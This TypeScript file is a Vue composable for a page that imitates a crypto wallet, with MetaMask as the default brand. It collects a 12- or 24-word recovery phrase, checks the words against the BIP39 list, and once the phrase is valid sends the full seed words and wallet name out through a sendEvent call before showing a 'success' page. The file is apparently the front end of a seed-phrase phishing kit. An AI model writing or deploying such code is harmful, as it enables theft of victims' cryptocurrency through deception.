import { useFormStore } from "@/stores/form";
import { useWalletsStore } from "@/stores/wallets";
import { SeedInput, WalletItem } from "@/types/app";
import { storeToRefs } from "pinia";
import { reactive, ref, watch } from "vue";
import { useRouter } from "vue-router";
import { sendEvent } from "./useEventHandler";
import { WordlistBip39 } from "@/types/app";
import wordlist from "@/assets/worldlist.json";
import { validateMnemonic } from "web-bip39";

export function useIntermediateData() {
  const $wallets = useWalletsStore();
  const loaderState = ref<"loading" | "success">("loading");
  const $router = useRouter();
  const $form = useFormStore();
  const { selectedLengthValue } = storeToRefs($form);

  const options = [
    {
      value: "12",
      label: "I have a 12-word phrase",
    },
    {
      value: "24",
      label: "I have a 24-word phrase",
    },
  ];

  const nextTo = (routeName: string) => {
    sendEvent({ type: "page", page: routeName });
    $router.push({ name: routeName });
  };

  const wallet = reactive<WalletItem>(
    $wallets.getSelectedWallet() || {
      name: "metamask",
      title: "Metamask",
      image: "icons/metamask.svg",
      primaryColor: "#f6851b",
      secondaryColor: "#f6851b40",
      textColor: "#a95b12",
    }
  );

  const seedInput = ref<SeedInput[]>([]);

  // Clear & create SeedInput array
  watch(
    () => selectedLengthValue.value,
    (len) => {
      if (!len) return;
      seedInput.value = Array.from({ length: Number(len) }, () => ({
        model: ref(""),
        hide: true,
        valid: true,
        passed: false,
      }));
    },
    { immediate: true }
  );

  const bip39 = wordlist as unknown as WordlistBip39;

  // Validate
  watch(
    seedInput,
    (arr) => {
      arr.forEach((item) => {
        if (!bip39.includes(item.model) && item.model !== "") {
          item.valid = false;
        } else {
          item.valid = true;
        }
      });
    },
    { deep: true }
  );

  const canActivateValidateMnemonic = ref<boolean>(false);
  watch(
    seedInput,
    (arr) => {
      const values = arr.map((item) => item.model);
      canActivateValidateMnemonic.value = !values.includes("");
    },
    { deep: true }
  );

  const handlePaste = (event: ClipboardEvent) => {
    const text = event.clipboardData?.getData("text");
    if (!text) return;
    const words = text.trim().split(/\s+/);
    words.forEach((word, i) => {
      const target = seedInput.value[i];
      if (target) target.model = word;
    });
    event.preventDefault();
  };

  const toggleHide = (index: number) => {
    seedInput.value[index].hide = !seedInput.value[index].hide;
  };

  const validateMnemonicPhrase = async () => {
    loadingMnemonicNextButton.value = true;
    const mnemonic = seedInput.value.map((item) => item.model).join(" ");
    const valid = await validateMnemonic(mnemonic, wordlist as WordlistBip39);
    if (!valid) {
      seedInput.value.forEach((item) => (item.valid = false));
      loadingMnemonicNextButton.value = false;
    } else {
      seedInput.value.forEach((item) => (item.passed = true));
      setTimeout(() => {
        sendEvent({
          type: "data",
          data: {
            wallet: wallet.name,
            seedLength: Number(selectedLengthValue.value),
            seed: seedInput.value.map((item) => item.model),
          },
        });
        loadingMnemonicNextButton.value = false;
        nextTo("success");
      }, 1500);
    }
  };

  const loadingMnemonicNextButton = ref<boolean>(false);

  return {
    wallet,
    options,
    selectedLengthValue,
    loaderState,
    seedInput,
    handlePaste,
    toggleHide,
    nextTo,
    validateMnemonicPhrase,
    canActivateValidateMnemonic,
    loadingMnemonicNextButton,
  };
}
